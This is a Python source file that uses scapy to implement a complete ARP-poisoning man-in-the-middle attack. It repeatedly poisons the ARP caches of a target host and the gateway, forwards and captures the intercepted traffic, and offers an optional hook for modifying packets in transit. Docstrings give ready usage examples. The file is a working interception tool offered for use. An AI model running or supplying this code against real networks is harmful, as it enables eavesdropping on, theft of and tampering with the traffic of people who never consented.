from scapy.all import *
from threading import Thread
import time

PORT_FORWARD_FILE = "/proc/sys/net/ipv4/ip_forward"

class LinuxPortForwarding:
    """A utility class for setting up and removing the ability for this computer
    to forward packets. This is neccesary for MITMAttack to work.
    Example usage:
    >>> with LinuxPortForwarding():
    ...     packets = MITMAttack(...).run()
    """
    def __enter__(self):
        with open(PORT_FORWARD_FILE, "r") as f:
            self.previous_state = f.read()
        with open(PORT_FORWARD_FILE, "w") as f:
            f.write("1")

    def __exit__(self, type, value, traceback):
        with open(PORT_FORWARD_FILE, "w") as f:
            f.write(self.previous_state)
        return False

class MITMAttack:
    """Represents an ARP MITM attack, including poisoning and restoring.
    Example usage: (no timeout or such specified,
    so will sniff until receives KeyboardInterrupt)
    >>> with MITMAttack(target_ip="10.0.0.2") as packets:
    ...     packets.summary()
    ...     # After this line, the ARP state will be restored

    Note that the "with" block will not start running until the sniff finishes running.
    Alternatively, if you don't need to do anything while the attack is still running:
    >>> packets = MITMAttack(target_ip="10.0.0.2").run()
    ... packets.summary()

    This is equivalent to the previous example, except the ARP poison is restored
    before the packets.summary() line runs.

    A single MITMAttack object can be re-used several times to run the attack with
    the same parameters as long as no network changes happened (for example the
    target changing its IP)

    Also see LinuxPortForwarding class - required unless the port forwarding file is set manually
    """
    def __init__(self,
                 target_ip,
                 sniff_params={},
                 user_filter=lambda p: p,
                 verbose=True):
        """Initializes the object with information about the target,
        gateway and local machine. Does NOT start the poisoning.
        *target_ip*: the ip that will be attacked
        *sniff_params*: passed to bridge_and_sniff(). Used to specify timeout or stop_filter
        *user_filter*: similar to the xfrm arguments of bridge_and_sniff,
        applied in both directions of communication on the packet after it's patched by MITMAttack.
        Check `packet.direction` for the direction - 1 means from target to gateway, 0 for opposite.
        *verbose*: whether actions should be printed"""
        self.local_ip = get_if_addr(conf.iface)
        self.local_mac = get_if_hwaddr(conf.iface)

        self.gateway_ip = conf.route.route("0.0.0.0")[2]
        self.gateway_mac = get_mac(self.gateway_ip)

        self.target_ip = target_ip
        self.target_mac = get_mac(target_ip)

        self.sniff_params = sniff_params
        self.user_filter = user_filter

        self.verbose = verbose

        if self.verbose:
            print(f"Local:   {self.local_ip.ljust(IP_LENGTH)}, {self.local_mac}")
            print(f"Gateway: {self.gateway_ip.ljust(IP_LENGTH)}, {self.gateway_mac}")
            print(f"Target:  {self.target_ip.ljust(IP_LENGTH)}, {self.target_mac}")

    def __enter__(self):
        def poison_targets_async():
            t = threading.currentThread()
            while getattr(t, "running", True):
                if self.verbose: print("Re-poisoning")
                # Poison target - tell it I am the gateway
                poison_target(self.target_ip, self.target_mac, self.gateway_ip, self.local_mac, verbose=self.verbose)
                # Poison gateway - tell it I am the target
                poison_target(self.gateway_ip, self.gateway_mac, self.target_ip, self.local_mac, verbose=self.verbose)
                time.sleep(2)

        self.poison_thread = threading.Thread(target=poison_targets_async)
        if self.verbose: print("Launching poisoning thread.")
        self.poison_thread.start()

        packets = sniff(
                prn=mitm_forward(self.local_mac, self.local_ip, self.target_mac, self.target_ip, self.gateway_mac, self.gateway_ip, self.user_filter),
                lfilter=mitm_filter(self.local_mac, self.local_ip, self.target_mac, self.target_ip, self.gateway_mac, self.gateway_ip),
                **self.sniff_params,
                )

        # TODO: patch these packets to look like target -> gateway without local_mac at all?
        # Could help with analyzing sessions
        for packet in packets:
            if packet[Ether].src == self.target_mac:
                packet[Ether].dst = self.gateway_mac
            if packet[Ether].src == self.gateway_mac:
                packet[Ether].dst = self.target_mac

        return packets

    def __exit__(self, type, value, traceback):
        if self.verbose: print("Restoring")
        self.poison_thread.running = False
        # Restore target and gateway to talk to each other
        poison_target(self.target_ip, self.target_mac,
                self.gateway_ip, self.gateway_mac, verbose=self.verbose)
        poison_target(self.gateway_ip, self.gateway_mac,
                self.target_ip, self.target_mac, verbose=self.verbose)
        return False  # re-raise if there's an exception

    def run(self):
        """Run the attack and return captured packets.
        Equivalent to running it with `with` and doing nothing in the block.
        So:
        >>> with MITMAttack(...) as result: pass

        And
        >>> result = MITMAttack(...).run()

        Are equivalent.
        """
        with self as res: pass
        return res

IP_LENGTH = 15

def get_mac(target_ip, verbose=False):
    if verbose: print(f"Getting {target_ip}'s mac...")
    # Fun fact - this is already implemented in scapy function called getmacbyip
    arp_broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(op=1, pdst=target_ip)  # op=1 is WHO(mac) HAS this ip
    response = srp(arp_broadcast, verbose=False, timeout=2, retry=5)
    try:
        response = response[0][0][1]  # op should be 2 which means IS AT
    except IndexError:
        raise Exception(f"Couldn't look up mac of {target_ip}")
    return response.hwsrc

def poison_target(target_ip, target_mac, ip, mac, verbose=True):
    """Make machine at (`target_ip`, `target_mac`) associate `ip` with `mac`"""
    if verbose:
        print(f"ARPing {target_ip.ljust(IP_LENGTH)} to set {ip.ljust(IP_LENGTH)}={mac}")
    poison = ARP(op=2, hwsrc=mac, psrc=ip, pdst=target_ip, hwdst=target_mac)
    send(poison, verbose=False)

def mitm_filter(local_mac, local_ip, target_mac, target_ip, gateway_mac, gateway_ip):
    def filter(p):
        if IP not in p or Ether not in p: return False
        p_src_mac = p[Ether].src
        p_dst_mac = p[Ether].dst
        p_src_ip  = p[IP].src
        p_dst_ip  = p[IP].dst

        # target -> me -> gateway -> internet
        to_internet = p_src_mac == target_mac and p_dst_mac == local_mac and p_dst_ip != local_ip
        # internet -> gateway -> me -> target
        to_target = p_src_mac == gateway_mac and p_dst_mac == local_mac and p_dst_ip == target_ip
        return to_target or to_internet
    return filter

def mitm_forward(local_mac, local_ip, target_mac, target_ip, gateway_mac, gateway_ip, user_filter):
    def convert(p):
        if IP not in p or Ether not in p: return False
        p_src_mac = p[Ether].src
        p_dst_mac = p[Ether].dst
        p_src_ip  = p[IP].src
        p_dst_ip  = p[IP].dst
        # Don't have to check the exact path of the target because it's already checked in lfilter
        if p_src_mac == target_mac:
            # To gateway then internet
            print("to internet")
            p[Ether].src = local_mac
            p[Ether].dst = gateway_mac
            p.direction = 1
            return user_filter(p)
        elif p_src_mac == gateway_mac:
            # From internet to target
            print("to target")
            p[Ether].src = local_mac
            p[Ether].dst = target_mac
            p.direction = 0
            p.show()  # print
            return user_filter(p)
        else:
            return None

    def wrapper(p):
        try:
            p = convert(p)
            if p: send(p, verbose=False)
        except Exception as e:
            print(e)

    return wrapper

